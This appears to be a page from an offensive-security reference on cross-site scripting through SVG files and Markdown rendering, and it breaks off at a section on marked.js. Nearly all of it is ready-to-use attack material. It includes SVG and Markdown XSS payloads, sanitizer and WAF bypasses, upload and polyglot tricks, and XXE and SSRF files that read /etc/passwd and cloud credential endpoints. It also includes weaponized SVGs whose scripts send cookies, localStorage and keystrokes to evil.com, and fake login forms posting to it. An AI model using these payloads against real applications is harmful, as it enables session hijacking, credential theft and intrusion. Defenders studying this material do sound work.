---
title: XSS via SVG & Markdown
description: Cross-Site Scripting through SVG files and Markdown rendering — payloads, filter bypass, file upload exploitation, sanitizer evasion, Markdown injection, rendering engine abuse, and advanced exfiltration techniques.
navigation:
  icon: i-lucide-image
  title: XSS via SVG & Markdown
---

## What is XSS via SVG & Markdown?

**SVG (Scalable Vector Graphics)** files are XML-based image formats that can contain **embedded JavaScript**, **event handlers**, **external resource references**, and **HTML foreign objects**. Unlike PNG or JPEG, SVG is a **living document** — browsers parse and execute code within SVGs just like HTML pages. **Markdown** is a lightweight markup language that gets **rendered into HTML** by parsers. When Markdown parsers allow raw HTML, inline attributes, or improperly sanitize output, attackers inject **executable JavaScript** through seemingly innocent text formatting.

::callout
---
icon: i-lucide-skull
color: red
---
SVG-based XSS is **exceptionally dangerous** because SVG files are treated as "images" by most developers and upload validators, yet browsers execute JavaScript within them. A malicious SVG uploaded as a "profile picture" or "document attachment" becomes a **stored XSS payload** that fires every time the image is rendered. Markdown XSS exploits the trust developers place in "safe" text formatting, bypassing sanitizers through parser differentials and edge cases.
::

::card-group
  ::card
  ---
  title: SVG Script Injection
  icon: i-lucide-code-xml
  ---
  SVG files support `<script>` tags, inline event handlers (`onload`, `onerror`), and `<foreignObject>` elements — all capable of executing arbitrary JavaScript in the rendering context.
  ::

  ::card
  ---
  title: SVG File Upload XSS
  icon: i-lucide-upload
  ---
  Applications that accept image uploads often allow SVG files. When served with `Content-Type: image/svg+xml`, the browser **fully renders and executes** embedded scripts.
  ::

  ::card
  ---
  title: Markdown HTML Injection
  icon: i-lucide-file-text
  ---
  Many Markdown renderers allow raw HTML tags inline. Attackers inject `<script>`, `<img onerror>`, and `<svg onload>` payloads through Markdown content fields.
  ::

  ::card
  ---
  title: Markdown Parser Differentials
  icon: i-lucide-git-branch
  ---
  Different Markdown parsers (marked, markdown-it, showdown, commonmark) have **different behaviors** with edge cases. What one parser sanitizes, another may render as executable HTML.
  ::
::

---

## SVG as an Attack Vector

### Why SVG is Dangerous

```text [svg-danger-explained.txt]
┌──────────────────────────────────────────────────────────────────┐
│                  WHY SVG FILES ARE DANGEROUS                     │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  REGULAR IMAGE (PNG/JPEG/GIF/WEBP):                             │
│  ├── Binary format                                               │
│  ├── No executable code                                          │
│  ├── Rendered by image decoder                                   │
│  ├── Cannot contain scripts                                      │
│  └── Safe to display inline                                      │
│                                                                  │
│  SVG "IMAGE":                                                    │
│  ├── XML text format (human-readable)                            │
│  ├── CAN contain <script> tags                                   │
│  ├── CAN contain event handlers (onload, onclick, etc.)          │
│  ├── CAN contain <foreignObject> with full HTML                  │
│  ├── CAN reference external resources (SSRF potential)           │
│  ├── CAN embed CSS with expressions                              │
│  ├── CAN contain <iframe> and <embed> elements                   │
│  ├── CAN execute JavaScript via <animate>, <set> events          │
│  ├── CAN use xlink:href with javascript: URI                     │
│  ├── Rendered by the FULL XML/HTML parser                        │
│  └── Essentially an HTML document disguised as an image          │
│                                                                  │
│  CONTEXT MATTERS:                                                │
│  ├── <img src="evil.svg">     → Scripts BLOCKED (sandboxed)     │
│  ├── <embed src="evil.svg">   → Scripts EXECUTE ✗               │
│  ├── <object data="evil.svg"> → Scripts EXECUTE ✗               │
│  ├── <iframe src="evil.svg">  → Scripts EXECUTE ✗               │
│  ├── Direct navigation (URL)  → Scripts EXECUTE ✗               │
│  ├── CSS background-image     → Scripts BLOCKED                  │
│  └── <svg> inline in HTML     → Scripts EXECUTE ✗               │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### SVG Rendering Context Matrix

| Context | JavaScript Executes? | Cookies Accessible? | Origin |
|---------|:-------------------:|:-------------------:|--------|
| `<img src="evil.svg">` | ❌ No | ❌ No | N/A (sandboxed) |
| `<embed src="evil.svg">` | ✅ **Yes** | ✅ **Yes** | Same as page |
| `<object data="evil.svg">` | ✅ **Yes** | ✅ **Yes** | Same as page |
| `<iframe src="evil.svg">` | ✅ **Yes** | ✅ **Yes** | SVG file's origin |
| Direct URL navigation | ✅ **Yes** | ✅ **Yes** | SVG file's origin |
| CSS `background-image` | ❌ No | ❌ No | N/A |
| Inline `<svg>` in HTML | ✅ **Yes** | ✅ **Yes** | Page's origin |
| `<input type="image" src>` | ❌ No | ❌ No | N/A |
| CSS `content: url()` | ❌ No | ❌ No | N/A |
| Markdown `![](evil.svg)` | ❌ No (renders as `<img>`) | ❌ No | N/A |
| Open in new tab | ✅ **Yes** | ✅ **Yes** | SVG file's origin |

---

## SVG XSS Payloads

### Core SVG XSS Payloads

::tabs
  :::tabs-item{icon="i-lucide-code" label="Script Tag Payloads"}
  ```xml [svg-script-payloads.svg]
  <!-- ═══ BASIC SCRIPT TAG ═══ -->
  <?xml version="1.0" standalone="no"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      alert(document.domain);
    </script>
  </svg>

  <!-- ═══ SCRIPT WITH CDATA ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      <![CDATA[
        alert('XSS via SVG CDATA');
      ]]>
    </script>
  </svg>

  <!-- ═══ EXTERNAL SCRIPT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <script xlink:href="https://evil.com/xss.js"/>
  </svg>

  <!-- ═══ SCRIPT WITH HREF (SVG 2.0) ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script href="https://evil.com/xss.js"/>
  </svg>

  <!-- ═══ ECMASCRIPT TYPE ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/ecmascript">
      alert(document.cookie);
    </script>
  </svg>

  <!-- ═══ APPLICATION/JAVASCRIPT TYPE ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="application/javascript">
      fetch('https://evil.com/steal?c='+document.cookie);
    </script>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Event Handler Payloads"}
  ```xml [svg-event-payloads.svg]
  <!-- ═══ ONLOAD EVENT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  </svg>

  <!-- ═══ MINIMAL ONLOAD ═══ -->
  <svg onload=alert(1)>

  <!-- ═══ ONLOAD WITH COOKIE THEFT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg" 
    onload="fetch('https://evil.com/s?c='+document.cookie)">
  </svg>

  <!-- ═══ ONFOCUSIN EVENT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" onfocusin="alert(1)" tabindex="1"/>
  </svg>

  <!-- ═══ ONMOUSEOVER EVENT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="500" height="500" fill="white" 
      onmouseover="alert(document.domain)"/>
  </svg>

  <!-- ═══ ONCLICK EVENT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="50" font-size="30" onclick="alert(1)">
      Click me
    </text>
  </svg>

  <!-- ═══ ONBEGIN (ANIMATION) ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onbegin="alert(document.domain)" attributeName="x" dur="1s"/>
  </svg>

  <!-- ═══ ONSET (ANIMATION) ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <set onbegin="alert(1)" attributeName="x" to="1"/>
  </svg>

  <!-- ═══ ANIMATETRANSFORM ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animateTransform onbegin="alert(document.domain)" 
      attributeName="transform" type="rotate" dur="1s"/>
  </svg>

  <!-- ═══ ONERROR WITH BROKEN IMAGE ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <image href="x" onerror="alert(1)"/>
  </svg>

  <!-- ═══ DISCARD EVENT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <discard onbegin="alert(document.domain)"/>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="ForeignObject Payloads"}
  ```xml [svg-foreignobject-payloads.svg]
  <!-- ═══ FOREIGNOBJECT WITH FULL HTML ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>alert(document.domain)</script>
      </body>
    </foreignObject>
  </svg>

  <!-- ═══ FOREIGNOBJECT WITH IMG ONERROR ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <img src="x" onerror="alert(document.cookie)"/>
      </body>
    </foreignObject>
  </svg>

  <!-- ═══ FOREIGNOBJECT WITH IFRAME ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="javascript:alert(document.domain)"/>
      </body>
    </foreignObject>
  </svg>

  <!-- ═══ FOREIGNOBJECT WITH FORM (PHISHING) ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="400" height="300">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <h2>Session Expired</h2>
        <form action="https://evil.com/phish" method="POST">
          <input name="email" placeholder="Email"/><br/>
          <input name="password" type="password" placeholder="Password"/><br/>
          <button type="submit">Log In</button>
        </form>
      </body>
    </foreignObject>
  </svg>

  <!-- ═══ FOREIGNOBJECT WITH KEYLOGGER ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>
          document.addEventListener('keypress', function(e) {
            new Image().src='https://evil.com/k?k='+e.key;
          });
        </script>
        <p>Loading document preview...</p>
      </body>
    </foreignObject>
  </svg>

  <!-- ═══ NESTED SVG IN FOREIGNOBJECT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="100" height="100">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
        </svg>
      </body>
    </foreignObject>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="xlink:href & URI Payloads"}
  ```xml [svg-xlink-payloads.svg]
  <!-- ═══ XLINK:HREF JAVASCRIPT URI ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="javascript:alert(document.domain)">
      <rect width="200" height="100" fill="blue"/>
      <text x="30" y="55" fill="white" font-size="18">Click Me</text>
    </a>
  </svg>

  <!-- ═══ SVG 2.0 HREF (NO XLINK NEEDED) ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <a href="javascript:alert(document.domain)">
      <text x="10" y="30">Click for XSS</text>
    </a>
  </svg>

  <!-- ═══ USE ELEMENT WITH JAVASCRIPT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
  </svg>

  <!-- ═══ IMAGE WITH DATA URI ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiPjwvc3ZnPg=="/>
  </svg>

  <!-- ═══ SET ELEMENT HREF MANIPULATION ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <a id="link" xlink:href="https://safe.com">
      <text x="10" y="30">Safe Link</text>
    </a>
    <set xlink:href="#link" attributeName="xlink:href" 
      to="javascript:alert(document.domain)" begin="0s"/>
  </svg>

  <!-- ═══ ANIMATE HREF TO JAVASCRIPT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <a id="target" xlink:href="https://safe.com">
      <text x="10" y="30">Click</text>
    </a>
    <animate xlink:href="#target" attributeName="href"
      values="javascript:alert(1)" dur="1s" fill="freeze"/>
  </svg>
  ```
  :::
::

### SVG Filter Bypass Payloads

::tabs
  :::tabs-item{icon="i-lucide-code" label="Encoding Bypasses"}
  ```xml [svg-encoding-bypasses.svg]
  <!-- ═══ HTML ENTITY ENCODING ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>
  </svg>

  <!-- ═══ HEX ENTITY ENCODING ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script>
  </svg>

  <!-- ═══ BASE64 DATA URI ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+">
      <text x="10" y="30">Click</text>
    </a>
  </svg>

  <!-- ═══ UTF-7 ENCODING (LEGACY) ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</script>
  </svg>

  <!-- ═══ UNICODE ESCAPES IN JAVASCRIPT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg" 
    onload="\u0061\u006C\u0065\u0072\u0074(1)">
  </svg>

  <!-- ═══ MIXED CASE TAG NAMES ═══ -->
  <SVG XMLNS="http://www.w3.org/2000/svg" ONLOAD="alert(1)">
  </SVG>

  <Svg Xmlns="http://www.w3.org/2000/svg">
    <Script>alert(document.domain)</Script>
  </Svg>

  <!-- ═══ NEWLINES AND TABS IN ATTRIBUTES ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg"
    on
    load
    =
    "alert(1)"
  >
  </svg>

  <!-- ═══ NULL BYTE INJECTION ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <scr%00ipt>alert(1)</scr%00ipt>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Tag & Attribute Bypasses"}
  ```xml [svg-tag-bypasses.svg]
  <!-- ═══ WITHOUT XMLNS (INLINE HTML CONTEXT) ═══ -->
  <svg><script>alert(1)</script></svg>
  <svg onload=alert(1)>
  <svg/onload=alert(1)>

  <!-- ═══ NESTED SVG ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <svg onload="alert(document.domain)">
    </svg>
  </svg>

  <!-- ═══ SVG WITH MATH (MathML CONTEXT) ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject>
      <math xmlns="http://www.w3.org/1998/Math/MathML">
        <maction actiontype="statusline" 
          xlink:href="javascript:alert(1)">
          Click
        </maction>
      </math>
    </foreignObject>
  </svg>

  <!-- ═══ SVG STYLE ELEMENT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <style>
      @keyframes x {}
    </style>
    <rect style="animation-name:x" onanimationstart="alert(1)"
      width="100" height="100"/>
  </svg>

  <!-- ═══ SVG HANDLER ATTRIBUTE ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <handler xmlns:ev="http://www.w3.org/2001/xml-events" 
      ev:event="SVGLoad" type="application/ecmascript">
      alert(document.domain)
    </handler>
  </svg>

  <!-- ═══ SVG WITH MARKER ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <defs>
      <marker id="m" markerWidth="10" markerHeight="10">
        <foreignObject width="10" height="10">
          <body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"/>
        </foreignObject>
      </marker>
    </defs>
    <line x1="0" y1="0" x2="100" y2="100" marker-end="url(#m)"/>
  </svg>

  <!-- ═══ SVG FEIMAGE EXTERNAL REFERENCE ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <filter id="f">
      <feImage xlink:href="https://evil.com/tracking-pixel.gif"/>
    </filter>
    <rect filter="url(#f)" width="100" height="100"/>
  </svg>

  <!-- ═══ SVG WITH CUSTOM ELEMENT ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <x:script xmlns:x="http://www.w3.org/1999/xhtml">
      alert(document.domain)
    </x:script>
  </svg>

  <!-- ═══ CDATA BYPASS ═══ -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>
    //<![CDATA[
      alert(document.domain)
    //]]>
    </script>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Sanitizer Bypass Payloads"}
  ```xml [svg-sanitizer-bypasses.svg]
  <!-- ═══ DOMPurify BYPASS ATTEMPTS ═══ -->
  
  <!-- Mutation XSS: Parser differential -->
  <svg><style><![CDATA[</style><script>alert(1)</script>]]></style></svg>

  <!-- Namespace confusion -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <g>
      <foreignObject>
        <p xmlns="http://www.w3.org/1999/xhtml">
          <style>
            <![CDATA[</style><script>alert(1)</script>]]>
          </style>
        </p>
      </foreignObject>
    </g>
  </svg>

  <!-- ═══ BLEACH / SERVER-SIDE SANITIZER BYPASSES ═══ -->
  
  <!-- Double encoding -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
      <text x="10" y="30">Click</text>
    </a>
  </svg>

  <!-- Attribute without quotes -->
  <svg xmlns=http://www.w3.org/2000/svg onload=alert(1)>

  <!-- Tab characters in event handler name -->
  <svg xmlns="http://www.w3.org/2000/svg" on	load="alert(1)">
  </svg>

  <!-- ═══ ANGULAR / REACT SANITIZER BYPASSES ═══ -->
  
  <!-- Angular DomSanitizer bypass via SVG -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>
      <set attributeName="innerHTML" 
        to="<img src=x onerror=alert(1)>"/>
    </text>
  </svg>

  <!-- React dangerouslySetInnerHTML with SVG -->
  <!-- If SVG content is set via dangerouslySetInnerHTML -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>

  <!-- ═══ WAF BYPASS SVGs ═══ -->
  
  <!-- Split across lines -->
  <svg 
  xmlns="http://www.w3.org/2000/svg"
  >
  <script
  >
  alert
  (1)
  </script
  >
  </svg>

  <!-- Comments inside tags -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script><!-- 
    -->alert(1)<!-- 
    --></script>
  </svg>

  <!-- Processing instruction -->
  <?xml version="1.0"?>
  <?xml-stylesheet type="text/xsl" href="data:text/xml,<xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform'><xsl:template match='/'><script>alert(1)</script></xsl:template></xsl:stylesheet>"?>
  <svg xmlns="http://www.w3.org/2000/svg"></svg>
  ```
  :::
::

### SVG File Upload Exploitation

::tabs
  :::tabs-item{icon="i-lucide-code" label="Weaponized SVG Files"}
  ```xml [weaponized-svgs.svg]
  <!-- ═══ COOKIE STEALER SVG ═══ -->
  <!-- Save as: innocent-image.svg -->
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" 
       xmlns:xlink="http://www.w3.org/1999/xlink"
       width="200" height="200" viewBox="0 0 200 200">
    <!-- Looks like a normal icon -->
    <circle cx="100" cy="100" r="80" fill="#4CAF50"/>
    <text x="100" y="115" text-anchor="middle" fill="white" 
      font-size="40" font-family="sans-serif">✓</text>
    
    <!-- Hidden malicious code -->
    <script type="text/javascript">
      <![CDATA[
        (function() {
          var data = {
            cookie: document.cookie,
            url: location.href,
            localStorage: JSON.stringify(localStorage),
            timestamp: Date.now()
          };
          navigator.sendBeacon(
            'https://evil.com/svg-steal',
            JSON.stringify(data)
          );
        })();
      ]]>
    </script>
  </svg>

  <!-- ═══ KEYLOGGER SVG ═══ -->
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
    <script type="text/javascript">
      <![CDATA[
        if (window.parent && window.parent !== window) {
          // Running inside an embed/object/iframe on a page
          var target = window.parent.document;
          target.addEventListener('keypress', function(e) {
            navigator.sendBeacon('https://evil.com/keys', JSON.stringify({
              key: e.key,
              target: e.target.name || e.target.id || e.target.tagName,
              url: window.parent.location.href,
              timestamp: Date.now()
            }));
          }, true);
        }
      ]]>
    </script>
  </svg>

  <!-- ═══ PHISHING OVERLAY SVG ═══ -->
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
    <foreignObject width="100%" height="100%">
      <body xmlns="http://www.w3.org/1999/xhtml" 
        style="margin:0;font-family:sans-serif;">
        <div style="position:fixed;top:0;left:0;right:0;bottom:0;
                    background:white;z-index:99999;
                    display:flex;align-items:center;justify-content:center;">
          <div style="width:400px;padding:30px;border:1px solid #ddd;border-radius:8px;">
            <h2 style="margin:0 0 20px;">Session Expired</h2>
            <form action="https://evil.com/phish" method="POST">
              <input name="email" placeholder="Email" 
                style="width:100%;padding:10px;margin:5px 0;"/><br/>
              <input name="password" type="password" placeholder="Password" 
                style="width:100%;padding:10px;margin:5px 0;"/><br/>
              <button style="width:100%;padding:10px;background:#007bff;
                            color:white;border:none;cursor:pointer;">
                Log In
              </button>
            </form>
          </div>
        </div>
      </body>
    </foreignObject>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SSRF via SVG"}
  ```xml [svg-ssrf.svg]
  <!-- ═══ SVG SSRF — EXTERNAL RESOURCE LOADING ═══ -->
  
  <!-- Image from internal network -->
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <image width="500" height="500" 
      xlink:href="http://169.254.169.254/latest/meta-data/"/>
  </svg>

  <!-- XSL stylesheet from internal URL -->
  <?xml version="1.0"?>
  <?xml-stylesheet type="text/xsl" 
    href="http://internal-server:8080/admin"?>
  <svg xmlns="http://www.w3.org/2000/svg"></svg>

  <!-- feImage filter (SSRF) -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
      <filter id="ssrf">
        <feImage xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
      </filter>
    </defs>
    <rect filter="url(#ssrf)" width="100" height="100"/>
  </svg>

  <!-- External DTD (XXE via SVG) -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="30">&xxe;</text>
  </svg>

  <!-- External entity via parameter entity -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="30">&exfil;</text>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Upload Bypass Techniques"}
  ```text [upload-bypass-techniques.txt]
  SVG FILE UPLOAD BYPASS TECHNIQUES:
  ══════════════════════════════════
  
  1. EXTENSION TRICKS
     ─────────────────
     file.svg             — Standard SVG extension
     file.SVG             — Uppercase (case-insensitive check)
     file.svgz            — Compressed SVG (gzipped)
     file.svg.png         — Double extension
     file.png.svg         — Reversed double extension
     file.svg%00.png      — Null byte (legacy)
     file.svg%0a.png      — Newline bypass
     file.xml             — SVG is valid XML
     
  2. CONTENT-TYPE TRICKS
     ────────────────────
     Content-Type: image/svg+xml          — Standard
     Content-Type: image/svg              — Non-standard but accepted
     Content-Type: text/xml               — Valid for SVG
     Content-Type: application/xml        — Valid for SVG
     Content-Type: image/png              — Lie about type (may bypass)
     Content-Type: application/octet-stream — Generic binary
  
  3. MAGIC BYTES / FILE SIGNATURE
     ────────────────────────────
     SVG has no binary magic bytes (it's XML text)
     Starts with: <?xml or <svg or whitespace
     Some validators check for PNG/JPEG magic bytes:
       → Prepend GIF89a or PNG header, then SVG content
       → May bypass magic-byte-only validation
  
  4. CONTENT EMBEDDING
     ──────────────────
     Embed SVG payload inside valid image:
     → SVG inside HTML (inline <svg> via HTML upload)
     → SVG inside XML (RSS feeds, SOAP, etc.)
     → SVG as data URI in CSS file upload
     → SVG in ZIP/DOCX/XLSX (Office formats use SVG)
  
  5. POLYGLOT FILES
     ───────────────
     GIF89a header + SVG body
     PDF header (%PDF) + SVG content
     HTML + SVG hybrid document
  ```
  :::
::

### SVG Polyglot Files

::code-collapse

```text [svg-polyglot-files.txt]
═══ GIF/SVG POLYGLOT ═══
Creates a file that is both a valid GIF and a valid SVG.

File content (hex + text):
47 49 46 38 39 61  (GIF89a header)
Then append the SVG XML:

GIF89a<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

Some parsers read the GIF header and classify as image.
Browsers render the SVG and execute JavaScript.


═══ HTML/SVG POLYGLOT ═══

<!-- This is valid HTML AND valid SVG -->
<!DOCTYPE html>
<html>
<body>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100" fill="green"/>
  <text x="10" y="50" fill="white">Valid Image</text>
</svg>
</body>
</html>

Serve as text/html → full HTML page with SVG
Serve as image/svg+xml → SVG with scripts
Upload as .html or .svg — both work


═══ XML/SVG POLYGLOT ═══

<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    // This executes when served as SVG
    alert(document.domain);
  </script>
  <text x="10" y="30">This is a valid XML document</text>
</svg>

Upload as .xml → may bypass .svg extension block
Browsers still render and execute the SVG content
```

::

---

## Markdown XSS Payloads

### Raw HTML Injection in Markdown

::tabs
  :::tabs-item{icon="i-lucide-code" label="Direct HTML Injection"}
  ```markdown [markdown-html-injection.md]
  # Markdown XSS — Direct HTML Tags

  <!-- Many Markdown renderers allow raw HTML -->

  <!-- Script Tag -->
  <script>alert(document.domain)</script>

  <!-- Image Error Event -->
  <img src=x onerror=alert(document.domain)>

  <!-- SVG Onload -->
  <svg onload=alert(1)>

  <!-- Details/Summary -->
  <details open ontoggle=alert(1)>
  <summary>Click me</summary>
  </details>

  <!-- Input Autofocus -->
  <input onfocus=alert(1) autofocus>

  <!-- Iframe -->
  <iframe src="javascript:alert(document.domain)">

  <!-- Body Tag -->
  <body onload=alert(1)>

  <!-- Embed Tag -->
  <embed src="javascript:alert(1)">

  <!-- Object Tag -->
  <object data="javascript:alert(1)">

  <!-- Marquee -->
  <marquee onstart=alert(1)>

  <!-- Video/Audio Error -->
  <video src=x onerror=alert(1)>
  <audio src=x onerror=alert(1)>

  <!-- Math (MathML) -->
  <math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click</maction></math>

  <!-- Form Button -->
  <form><button formaction=javascript:alert(1)>XSS</button></form>

  <!-- Table with Event -->
  <table background="javascript:alert(1)">
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Markdown Syntax Abuse"}
  ```markdown [markdown-syntax-abuse.md]
  # Markdown XSS — Syntax Abuse

  ## Link-Based XSS

  <!-- javascript: URI in links -->
  [Click me](javascript:alert(document.domain))
  [XSS](javascript:alert`1`)
  [XSS](javascript://%0aalert(1))
  [XSS](javascript:void(0);alert(1))

  <!-- Data URI in links -->
  [Click](data:text/html,<script>alert(1)</script>)
  [Click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

  <!-- VBScript (IE only) -->
  [XSS](vbscript:MsgBox("XSS"))

  ## Image-Based XSS

  <!-- Image with javascript: src (blocked in most parsers) -->
  ![alt](javascript:alert(1))

  <!-- Image with onerror via HTML -->
  ![alt](x" onerror="alert(1))
  
  <!-- Image with broken src triggering HTML -->
  ![alt](https://evil.com/x"onload="alert(1))

  ## Title Attribute Injection

  <!-- Link title injection -->
  [Click](https://example.com "onmouseover=alert(1)")
  [Click](https://example.com "onclick=alert(1) x")

  <!-- Image title injection -->
  ![img](https://example.com/img.png "onload=alert(1)")

  ## Autolink Abuse

  <!-- Some parsers auto-link URLs -->
  javascript:alert(1)
  <javascript:alert(1)>

  ## Reference-Style Link Abuse

  [Click here][xss]

  [xss]: javascript:alert(1)
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Advanced Markdown XSS"}
  ```markdown [markdown-advanced-xss.md]
  # Advanced Markdown XSS Techniques

  ## HTML Attribute Injection via Markdown Extensions

  <!-- Some Markdown parsers support custom attributes -->
  <!-- marked, markdown-it with plugins, kramdown, etc. -->

  {: onclick="alert(1)"}
  ## Heading with Event

  Paragraph text
  {: onmouseover="alert(1)"}

  - List item
  {: onfocus="alert(1)" tabindex="1"}

  ## Code Block Breakout

  <!-- Close code block and inject HTML -->
  ```
  </code></pre><img src=x onerror=alert(1)>
  ```

  <!-- Template literal abuse -->
  `${alert(1)}`

  ## Heading ID Injection

  <!-- Kramdown/Jekyll heading IDs -->
  ## Heading {#" onmouseover="alert(1)}

  ## Table Cell XSS

  | Header | Header2 |
  |--------|---------|
  | <img src=x onerror=alert(1)> | Normal |
  | Normal | <svg onload=alert(1)> |

  ## Footnote XSS

  Text with footnote[^1]

  [^1]: <img src=x onerror=alert(1)>

  ## Definition List XSS (Some parsers)

  Term
  : <img src=x onerror=alert(1)>

  ## Abbreviation XSS

  *[XSS]: <img src=x onerror=alert(1)>

  This is an XSS test.
  ```
  :::
::

### Markdown Parser-Specific Payloads

::tabs
  :::tabs-item{icon="i-lucide-code" label="marked.js Payloads"}
  ```markdown [marked-payloads.md]
  # marked.js XSS Payloads

  <!-- marked.js default: sanitize=false, allows HTML -->

